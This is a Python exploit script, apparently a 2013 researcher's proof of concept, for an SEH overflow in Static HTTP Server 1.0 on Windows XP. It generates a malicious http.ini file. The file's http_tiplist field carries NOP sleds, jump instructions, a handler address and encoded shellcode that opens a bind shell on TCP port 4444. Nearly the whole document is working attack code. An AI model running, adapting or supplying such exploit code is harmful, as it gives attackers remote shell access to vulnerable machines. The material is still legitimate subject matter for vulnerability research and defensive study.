#!/usr/bin/env python

import os

#
# Title************************Static HTTP Server SEH Overflow - HTTP Config - http_tiplist
# Discovered and Reported******June 2013
# Discovered/Exploited By******Jacob Holcomb/Gimppy, Security Analyst @ Independent Security Evaluators
# Exploit/Advisory*************http://infosec42.blogspot.com/
# Software*********************Static HTTP Server v1.0 (Listens on TCP/80)
# *****************************http://sourceforge.net/projects/static-httpd/?source=dlp
# Tested Platform*************Winodws XP SP2
# CVE**************************Static HTTP Server 1.0 - SEH Overflow: Pending
#
# Notes:
# Multiple HTTP commands and headers are vulnerable to overflows and trigger an exception, but 
# I was unable to control the SEH handler with anyting but configuration options in the http.ini.
#


def fileCreate():
		
	print "\n[*] Your current file directory is %s. " % os.getcwd()

	try:
		File = "http.ini"
		fileOpen = open(File, "w")
		print "[*] Configuration file %s will be written to %s." % (File, os.getcwd()) 	
		
	except:
		print "\n[*] ERROR! There was an issue creating your file. Please make sure you have write access to %s!!!!!\n" % os.getcwd	

	return fileOpen
	
	
def main():

	NOP1 = "\x90" * 1691
	NOP2 = NOP1[0:349]
	prev = "\xEB\xF6\x90\x90" #Short JMP -10 bytes
	Handler =  "\x9E\x1D\x40\x00"#00401D9E httpd.exe
	jmp = "\xe9\x87\xee\xff\xff"#FFFFEE87#"\xe9\xA3\xfe\xff\xff"
	#344 Byte Bind Shell TCP/4444
	shellcode = ("\xdb\xdd\xba\x81\x90\xd3\xb1\xd9\x74\x24\xf4\x5b\x2b\xc9" +
"\xb1\x50\x31\x53\x18\x83\xeb\xfc\x03\x53\x95\x72\x26\x4d" +
"\xff\x99\x84\x46\x06\xa2\xe8\x68\x98\xd6\x7b\xb3\x7c\x62" +
"\xc6\x87\xf7\x08\xcc\x8f\x06\x1e\x45\x20\x10\x6b\x05\x9f" +
"\x21\x80\xf3\x54\x15\xdd\x05\x85\x64\x21\x9c\xf5\x02\x61" +
"\xeb\x02\xcb\xa8\x19\x0c\x09\xc7\xd6\x35\xd9\x3c\x3f\x3f" +
"\x04\xb7\x60\x9b\xc7\x23\xf8\x68\xcb\xf8\x8e\x30\xcf\xff" +
"\x7b\xcd\xc3\x74\xf2\xbe\x3f\x97\x64\xfc\x0e\x7c\x02\x89" +
"\x33\xb2\x40\xcd\xbf\x39\x26\xd2\x12\xb6\x87\xe2\x32\xa1" +
"\x89\xbd\xc4\xdd\xc6\xbe\x0e\x7b\xb4\x26\xc6\xb7\x08\xcf" +
"\x61\xcb\x5e\x50\xd9\xd4\x4f\x06\x2a\xc7\x8c\xec\xfc\xe7" +
"\xbb\x4c\x75\xf2\x22\xf2\x68\xf5\xa8\xa1\x18\x04\x52\x99" +
"\xb4\xd1\xa5\xef\xe9\xb5\x4a\xd9\xa2\x6a\xe6\xb5\x17\xce" +
"\x5b\x79\xc4\x2f\x8b\x1b\x82\xde\x70\x82\x01\x68\x69\xdf" +
"\xcd\xce\x70\x90\xca\x58\x7a\x86\xbe\x76\xd5\x72\xc1\xa7" +
"\xbd\xd8\x90\x66\xd7\x76\x15\xa0\x74\x2c\x16\x9d\x13\x2b" +
"\xa1\x98\xad\xe4\xce\x73\x7d\x5f\x64\x29\x81\x8f\x17\xb9" +
"\x9a\x49\xd1\x43\x32\x55\x0b\xe6\x43\x79\xd5\x63\xd8\x1c" +
"\x71\x17\x4d\x68\x64\xbd\xdd\x33\x4f\x8e\x57\x24\xe5\x4a" +
"\xe1\x49\xc8\x92\x02\x27\xd4\x51\xc8\xc6\x6a\x7a\x81\xba" +
"\x10\xba\x0e\x6f\x4f\xd2\x22\x8e\x3c\x35\x3c\x1b\x06\xc5" +
"\x14\xbf\xd1\x6b\xc8\x11\x8c\xe1\xeb\xc0\x7f\xa3\xba\x1d" +
"\xaf\x23\x90\x3b\x4a\x7a\xb9\x44\x82\xe8\xc1\x44\x1d\x12" +
"\xed\x30\x36\x10\x8d\x83\xdc\x17\x44\x59\xe3\x38\x01\xae" +
"\x91\xbd\x8d\x1d\x5a\x6b\xce\x72")
	sploit = NOP2 + shellcode + NOP1 + jmp + prev + Handler
	File = fileCreate()
	Config = ("""
# HTTP Daemon config file
# GarajCode programed by Savu Andrei

# This is the configuration file


# You can configure the maximum number
# of simultanious connections 
max_http_connections = 256


# The port on which the server will listen
http_port = 80

# Multiple connections from same computer
http_mcsc = 1

# Banned ip list - separed by ;
http_ubip = 0
# http_biplist = ""

# Trusted ip list - separed by ;
http_utip = 0
# http_tiplist = "%s"
	
	""") % sploit
	
	File.write(Config)
	File.close()
	
if __name__ == "__main__":
	main()